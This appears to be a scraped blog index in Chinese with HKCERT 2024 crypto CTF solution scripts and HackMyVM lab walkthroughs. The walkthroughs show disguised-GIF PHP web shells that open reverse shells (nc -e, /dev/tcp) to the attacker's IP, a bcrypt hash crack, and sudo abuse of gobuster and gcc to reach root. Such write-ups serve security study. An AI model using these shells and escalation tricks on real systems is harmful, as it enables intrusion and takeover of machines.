return str(pow(res, e, n))[::2] if __name__ == '__main__': e = 65537 p, q = 1, 1 while p == q: while (p-1) % e == 0: p = getPrime(513) while (q-1) % e == 0: q = getPrime(513) m = bytes_to_long(FLAG) n = p * q c = pow(m, e, n) print(f'{c = }') for _ in range(6): expr = input('Input your expression in terms of p, q and r: ') print(mask_expr(expr)) 他是一个改编题，原版是 https://github.com/OfficialCyberSpace/CSCTF-2024/tree/main/crypto/mask-rsa ，修改地方就是e=3 -\u003e 65537，还有交互的内容发送接收不同了，我们根据原题目的exp去修改适配就行了 from pwn import * from math import gcd from Crypto.Util.number import isPrime as is_prime def attempt(id): e = 65537 log.info(f'attempt #{id}') r = remote('node7.anna.nssctf.cn',24426) r.recvuntil(b'c = ') c0 = int(r.recvline().decode()) r.sendline(b'p') r.sendline(b'q') r.sendline(b'p+q') r.recvuntil(b'Input your expression in terms of p, q and r: ') s1 = int(r.recvline().decode()) # a := p^e mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s2 = int(r.recvline().decode()) # b := q^e mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s3 = int(r.recvline().decode()) # c := (p^e + q^e) mod n # s1 and s2 are of different lengths if set([len(str(s1)), len(str(s2))]) != set([154, 155]): r.close() return False # Require that a + b = c if len(str(s3)) != 155: r.close() return False if len(str(s1)) \u003c len(str(s2)): # p \u003c q s1, s2 = s2, s1 r.sendline(b'q-p') r.sendline(b'p+p') r.sendline(b'-q%p') else: # p \u003e q r.sendline(b'p-q') r.sendline(b'q+q') r.sendline(b'-p%q') # Nonetheless, we have p \u003e q now. r.recvuntil(b'Input your expression in terms of p, q and r: ') s4 = int(r.recvline().decode()) # s4 := (p^e - q^e) mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s5 = int(r.recvline().decode()) # s5 := (2^e q^e) mod n r.recvuntil(b'Input your expression in terms of p, q and r: ') s6 = int(r.recvline().decode()) # s6 := (-p^e - 2^e q^e) mod n if len(str(s4)) != 154: r.close() return False if len(str(s5)) != 155: r.close() return False if len(str(s6)) != 154: r.close() return False _a = [None for _ in range(309)] _b = [None for _ in range(309)] _s = [None for _ in range(309)] # a+b _d = [None for _ in range(309)] # a-b _c = [None for _ in range(309)] # c _f = [None for _ in range(309)] # c-a for i in range(155): _a[2*i+0] = int(str(s1)[i]) for i in range(154): _b[2*i+1] = int(str(s2)[i]); _b[0] = 0 for i in range(155): _s[2*i+0] = int(str(s3)[i]) for i in range(154): _d[2*i+1] = int(str(s4)[i]); _d[0] = 0 for i in range(155): _c[2*i+0] = int(str(s5)[i]) for i in range(154): _f[2*i+1] = int(str(s6)[i]); _f[0] = 0 assert _a[0] == 1 a = b = s = d = 0 for i in range(308, 0, -2): # Fill in the i-th digit a += _a[i] * 10**(308-i) s += _s[i] * 10**(308-i) b = (s - a) % 10**(308-i+1) d = (a - b) % 10**(308-i+1) # Fill in the (i-1)-th digit b += _b[i-1] * 10**(308-i+1) d += _d[i-1] * 10**(308-i+1) a = (b + d) % 10**(308-i+2) s = (a + b) % 10**(308-i+2) a += _a[0] * 10**308 s += _s[0] * 10**308 c = f = 0 for i in range(308, 0, -2): # Fill in the i-th digit c += _c[i] * 10**(308-i) f = (c - a) % 10**(308-i+1) # Fill in the (i-1)-th digit f += _f[i-1] * 10**(308-i+1) c = (f + a) % 10**(308-i+2) c += _c[0] * 10**308 f += _f[0] * 10**308 # a = p^e mod n # b = q^e mod n # Sanity check assert int(str(a)[::2]) == s1 assert int(str(b)[::2]) == s2 assert int(str(s)[::2]) == s3 assert int(str(d)[::2]) == s4 assert a + b == s assert a - b == d assert c - a == f # a = p^65537 mod n # b = q^65537 mod n # c = 2^65537 * q^65537 mod n q = gcd(b, c) for k in range(2, 10**6): while q % k == 0: q //= k assert q.bit_length() == 513 assert is_prime(q) dq = pow(e, -1, q-1) p = pow(a, dq, q)","date":"2025-02-24","objectID":"/hkcert2024/:2:2","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg0 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') seed = secrets.randbits(16) | 1 lcg = LCG(bits=128, seed=seed) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') seed只有16位，我们只需要优化一下线程或者是直接爆破就行 from Crypto.Util.number import isPrime as is_prime from tqdm import trange class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed self.a = a self.c = c self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1) n = c = for seed in trange(58725, 2**16, 2): lcg.seed = seed p = get_prime(lcg, bits=1024) if n%p == 0: break flag = pow(c, pow(65537, -1, p-1), p) print(bytes.fromhex(f'{flag:x}')) ","date":"2025-02-24","objectID":"/hkcert2024/:2:3","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg1 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') lcg = LCG(bits=256, c=0) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') seed很大，爆破就不现实了，发现c=0，这就在暗示思路了 $$ (s \\times a^{x_1} ) \\times (s \\times a^{x_2} ) \\times (s \\times a^{x_3} ) \\times (s \\times a^{x_4} ) \\equiv n \\mod m \\\\ a^{x_1 +x_2+x_3+x_4} \\times s^4 \\equiv n \\mod m \\\\ let \\ t = x_1 +x_2+x_3+x_4 \\\\ s^4 ≡ n \\times a^{-t} $$哎推到这里了，我要去求s，对式子开四次方，na已知，我只要暴力求解t就行了,这个t都是4个一批的 import secrets class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p n = c = a = m = 2**256 from Crypto.Util.number import * t = 0 while True: t += 4 for seed in Zmod(m)(n * pow(a, -t, m)).nth_root(4, all=True): lcg = LCG(bits=256, seed=int(seed), a=a, c=0) p = get_prime(lcg, bits=1024) if n%p != 0: continue flag = pow(c, pow(65537, -1, p-1), p) flag=long_to_bytes(flag) print(flag) ","date":"2025-02-24","objectID":"/hkcert2024/:2:4","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg2 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') lcg = LCG(bits=256, a=1) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') 和上一个一样爆破是不可能的，我们现在的式子就变成了s+xc，我感觉更像一个算法题（），我们利用01去写四个误差情况，计算出可能的误差，排列出所有的情况，用异常去判断情况，然后通过的去求多项式根，直到能n整除为止 还有一个方法是利用格求解 import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime import itertools from tqdm import tqdm class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 pi_list = [] for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits pi = lcg.next() pi_list.append(pi) p |= pi if i == 0: orig_seed = pi if int(p).bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = b'hkcert24{***REDACTED***}' c = M = 2^256 n = possible_bias = [(0, 0, 0, 1), (0, 0, 1, 1), (0, 1, 1, 1), (0, 0, 0, 0)] possible_B = [] for bias_list in possible_bias: B = sum((i * c - bi * M) * M^(3-i) for i, bi in enumerate(bias_list)) possible_B.append(B) A = sum(M^(3-i) for i in range(len(bias_list))) for my_indices in itertools.product(range(4), repeat=4): Bs = prod(possible_B[index] for index in my_indices) % A if Bs == n % A: break else: raise Exception(\"abab\") B_list = [possible_B[index] for index in my_indices] bias_list = [possible_bias[index] for index in my_indices] print(f'{bias_list = }') PR.\u003cx\u003e = Zmod(n)[] for kdiff_0 in tqdm(range(-3000, 3000)): kdiff = 4 * kdiff_0 xdiff0 = c * kdiff % M for xdiff in [xdiff0, xdiff0 - M]: f0 = (A * x + B_list[0]) * (A * (x + xdiff) + B_list[1]) f = f0.monic() sol = f.small_roots(X=2^256, beta=0.48) for x_ in sol: p = A * ZZ(x_) + B_list[0] if n % p == 0: print(f'{p = }') exit() from Crypto.Util.number import * e = 65537 c = p = d = inverse(e, p-1) m = pow(c, d, p) print(long_to_bytes(m)) ","date":"2025-02-24","objectID":"/hkcert2024/:2:5","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"rsalcg3 task import os from functools import reduce from operator import mul import secrets from Crypto.Util.number import isPrime as is_prime class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed if self.seed is None: self.seed = secrets.randbits(bits) | 1 self.a = a if self.a is None: self.a = secrets.randbits(bits) | 1 self.c = c if self.c is None: self.c = secrets.randbits(bits) self.bits = bits self.m = 2**bits def next(self): self.seed = (self.seed * self.a + self.c) % self.m return self.seed def __repr__(self): return f'LCG(bits={self.bits}, a={self.a}, c={self.c})' def get_prime(lcg, bits): while True: p = 0 for i in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p if __name__ == '__main__': FLAG = os.environb.get(b'FLAG', b'hkcert24{***REDACTED***}') seed = secrets.randbits(128)\u003c\u003c128 | 1 lcg = LCG(bits=256, seed=seed) print(f'{lcg = }') ps = [get_prime(lcg, bits=1024) for _ in range(4)] n = reduce(mul, ps) e = 0x10001 m = int.from_bytes(FLAG, 'big') c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') 这个是真不会，seed被«128，那么$seed«128 \\mod 2^{128}=1$，按着佬的思路来说，直接做一个$2^{128}$的mitm，去恢复x1到x4，然后就有一个mod 2**256的方程，利用.roots(multiplicities=False)求解，或者是lsb也可以，看不懂。 from tqdm import trange, tqdm a = c = n = e = 65537 ct = class LCG: def __init__(self, bits, a=None, c=None, seed=None): self.seed = seed self.a = a self.c = c self.bits = bits self.m = 2**bits self.counter = 0 def next(self): self.seed = (self.seed * self.a + self.c) % self.m self.counter += 1 return self.seed def get_prime(lcg, bits): while True: p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() if p.bit_length() != bits: continue if not is_prime(p): continue return p def get_chunk(lcg, bits): p = 0 for _ in range(bits//lcg.bits): p \u003c\u003c= lcg.bits p |= lcg.next() return p lcg = LCG(bits=256, seed=1, a=a, c=c) MAX = 3200 m = 2**128 pp = [get_chunk(lcg, 1024) % m for _ in range(MAX)] # possible prime lsbs def mitm(): lookup = {} for x2 in trange(MAX): for x1 in range(x2): lookup[pp[x1] * pp[x2] % m] = (x1, x2) for x4 in trange(MAX): for x3 in range(x4): t = n * pow(pp[x3] * pp[x4], -1, m) % m if t in lookup: x1, x2 = lookup[t] return (x1, x2, x3, x4) x1, x2, x3, x4 = mitm() #x1, x2, x3, x4 = [2848, 3158, 595, 1597] print(x1, x2, x3, x4) x1, x2, x3, x4 = (4*(x1+1), 4*(x2+1), 4*(x3+1), 4*(x4+1)) m = 2**256 # now work mod 2**256 PR.\u003cs\u003e = PolynomialRing(Zmod(m)) def f(x): return (pow(a, x, m) * s + c * sum([pow(a, i, m) for i in range(x)])) g = f(x1) * f(x2) * f(x3) * f(x4) - n g = g.change_ring(ZZ) sol = {0} for i in range(256): cur_sol = set() for rr in sol: for b in [0, 1]: r = b*2**i + rr M = 2**(i+1) if 0 != g(r) % M: continue cur_sol.add(r) sol = cur_sol for seed in tqdm(sol): if seed % 2**128 != 1: continue if seed.bit_length() != 256: continue lcg = LCG(bits=256, seed=seed, a=a, c=c) p = get_prime(lcg, 1024) if n % p == 0: break flag = pow(ct, pow(e, -1, p-1), p) print(bytes.fromhex(f'{flag:x}')) ","date":"2025-02-24","objectID":"/hkcert2024/:2:6","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["CTF"],"content":"总结 含金量很高很难的比赛，24年没有去线下很遗憾，相信自己吧，25加油 ","date":"2025-02-24","objectID":"/hkcert2024/:3:0","tags":["crypto"],"title":"Hkcert2024","uri":"/hkcert2024/"},{"categories":["靶场"],"content":"up ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:0","tags":["渗透"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Up ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:1","tags":["渗透"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l [sudo] password for kali: Sorry, try again. [sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.238 08:00:27:ba:dc:8f (Unknown) 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded ┌──(kali㉿kali)-[~] └─$ nmap 192.168.31.238 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 10:21 HKT Nmap scan report for 192.168.31.238 Host is up (0.0012s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http MAC Address: 08:00:27:BA:DC:8F (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 先简单的用dirb扫一下 ┌──(kali㉿kali)-[~] └─$ dirb http://192.168.31.238 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sun Feb 23 10:33:50 2025 URL_BASE: http://192.168.31.238/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.238/ ---- + http://192.168.31.238/index.php (CODE:200|SIZE:4489) ==\u003e DIRECTORY: http://192.168.31.238/javascript/ + http://192.168.31.238/server-status (CODE:403|SIZE:279) ==\u003e DIRECTORY: http://192.168.31.238/uploads/ ---- Entering directory: http://192.168.31.238/javascript/ ---- ==\u003e DIRECTORY: http://192.168.31.238/javascript/jquery/ ---- Entering directory: http://192.168.31.238/uploads/ ---- + http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301) ---- Entering directory: http://192.168.31.238/javascript/jquery/ ---- + http://192.168.31.238/javascript/jquery/jquery (CODE:200|SIZE:289782) END_TIME: Sun Feb 23 10:34:08 2025 DOWNLOADED: 18448 - FOUND: 4 uploads估计是上传的文件，扫一下 ┌──(kali㉿kali)-[~] └─$ dirb http://192.168.31.238/uploads DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sun Feb 23 10:35:27 2025 URL_BASE: http://192.168.31.238/uploads/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.238/uploads/ ---- + http://192.168.31.238/uploads/robots.txt (CODE:200|SIZE:1301) END_TIME: Sun Feb 23 10:35:32 2025 DOWNLOADED: 4612 - FOUND: 1 ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:2","tags":["渗透"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["靶场"],"content":"反弹shell 打开得到 PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo= 一眼base64，厨子启动 \u003c?php if ($_SERVER['REQUEST_METHOD'] === 'POST') { $targetDir = \"uploads/\"; $fileName = basename($_FILES[\"image\"][\"name\"]); $fileType = pathinfo($fileName, PATHINFO_EXTENSION); $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME); $allowedTypes = ['jpg', 'jpeg', 'gif']; if (in_array(strtolower($fileType), $allowedTypes)) { $encryptedFileName = strtr($fileBaseName, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'); $newFileName = $encryptedFileName . \".\" . $fileType; $targetFilePath = $targetDir . $newFileName; if (move_uploaded_file($_FILES[\"image\"][\"tmp_name\"], $targetFilePath)) { $message = \"El archivo se ha subido correctamente.\"; } else { $message = \"Hubo un error al subir el archivo.\"; } } else { $message = \"Solo se permiten archivos JPG y GIF.\"; } } ?\u003e 这个代码简单来说就是文件名进行了rot13操作，且只允许上传jpg和gif文件 echo “\u003c ?php system(’nc -e /bin/bash 192.168.31.183 4444’); ?\u003e” \u003e zsm.gif bp传上去试试呗 ┌──(kali㉿kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [192.168.31.183] from (UNKNOWN) [192.168.31.238] 48740 ls access_denied.html clue.txt mfz.gif robots.txt home下的用户目录可以进，先把第一个flag拿了 ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:3","tags":["渗透"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["靶场"],"content":"提权 sudo -l Matching Defaults entries for www-data on debian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User www-data may run the following commands on debian: (ALL) NOPASSWD: /usr/bin/gobuster gobuster是提权点 gobuster无法对本地目录进行扫描，但可以使用-w参数将本地目录作为字典目录读取。因此，在本机运行http服务，在靶机运行gobuster，看靶机请求哪些文件。 sudo /usr/bin/gobuster dir -w \"/root/rodgarpass\" -u \"http://192.168.31.183:8888\" ┌──(kali㉿kali)-[~] └─$ python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET / HTTP/1.1\" 200 - 192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET /958637c2-0c37-44a1-93ad-48c9eba3a07c HTTP/1.1\" 404 - 192.168.31.238 - - [23/Feb/2025 10:56:32] code 404, message File not found 192.168.31.238 - - [23/Feb/2025 10:56:32] \"GET /b45cffe084dd3d20d928bee85e7b0f2 HTTP/1.1\" 404 - b45cffe084dd3d20d928bee85e7b0f2是个md5值 -\u003e string 结果不对wc， echo -n string |md5sum b45cffe084dd3d20d928bee85e7b0f21 - nb，这个作者少打个1 切换成这个用户，再看看提权点， rodgar@debian:~$ sudo -l sudo -l Matching Defaults entries for rodgar on debian: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User rodgar may run the following commands on debian: (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make gcc提权，写个binbash进去就行了 rodgar@debian:~$ sudo gcc -wrapper /bin/sh,-s . sudo gcc -wrapper /bin/sh,-s . id id uid=0(root) gid=0(root) grupos=0(root) -wrapper是gcc的参数，可以指定一个可执行文件，gcc会调用这个文件，并把gcc的参数传递给这个文件。 -s是交互式终端 ","date":"2025-02-23","objectID":"/vuln_hmv7/:1:4","tags":["渗透"],"title":"HMV up","uri":"/vuln_hmv7/"},{"categories":["靶场"],"content":"Airbind ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:0","tags":["渗透"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["靶场"],"content":"靶场链接 https://hackmyvm.eu/machines/machine.php?vm=Airbind ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:1","tags":["渗透"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["靶场"],"content":"日常扫描 ┌──(kali㉿kali)-[~] └─$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.149 d2:6d:24:38:04:12 (Unknown: locally administered) 192.168.31.156 08:00:27:97:c1:97 (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.853 seconds (138.15 hosts/sec). 5 responded ┌──(kali㉿kali)-[~] └─$ nmap 192.168.31.156 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 10:35 HKT Nmap scan report for 192.168.31.156 Host is up (0.0031s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp filtered ssh 80/tcp open http MAC Address: 08:00:27:97:C1:97 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds 直接打开发现是一个登录页面，不能打sql，直接简单dirb扫一下目录先 ┌──(kali㉿kali)-[~] └─$ dirb http://192.168.31.156 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Feb 22 10:47:17 2025 URL_BASE: http://192.168.31.156/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.31.156/ ---- + http://192.168.31.156/cronjobs (CODE:200|SIZE:410) ==\u003e DIRECTORY: http://192.168.31.156/db/ ==\u003e DIRECTORY: http://192.168.31.156/images/ ==\u003e DIRECTORY: http://192.168.31.156/includes/ + http://192.168.31.156/index.php (CODE:302|SIZE:0) ==\u003e DIRECTORY: http://192.168.31.156/libs/ ==\u003e DIRECTORY: http://192.168.31.156/screenshots/ ==\u003e DIRECTORY: http://192.168.31.156/scripts/ + http://192.168.31.156/server-status (CODE:403|SIZE:279) ==\u003e DIRECTORY: http://192.168.31.156/styles/ ","date":"2025-02-23","objectID":"/vuln_hmv6/:1:2","tags":["渗透"],"title":"HMV Airbind","uri":"/vuln_hmv6/"},{"categories":["靶场"],"content":"弹shell db页面打开有1个.db文件，看看，里面有admin和密码，爆一下 admin admin@localhost.com $$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S ┌──(kali㉿kali)-[~/Desktop] └─$ john hash -w=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X2]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:01:11 0.05% (ETA: 2025-02-24 00:13) 0g/s 129.7p/s 129.7c/s 129.7C/s rubberducky..gunit1 admin (?) 1g 0:00:02:33 DONE (2025-02-22 11:06) 0.006518g/s 129.2p/s 129.2c/s 129.2C/s bernadeth..LOVE1 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. byd弱密码,登录到主页，发现有个传个人信息的，可以传图片，扔个弹shell进去 \u003c ?php exec (\"/bin/bash -c ‘bash -i \u003e\u0026 /dev/tcp/192.168.31.183/4444 0\u003e\u00261’ “);?\u003e 弹shell成功 www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: ALL www-data@ubuntu:/var/www/html/images/uploads/logos$ su su Password: su: Authentication failure www-data@ubuntu:/var/www/html/images/uploads/logos$ www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo su root sudo su root id uid=0(root) 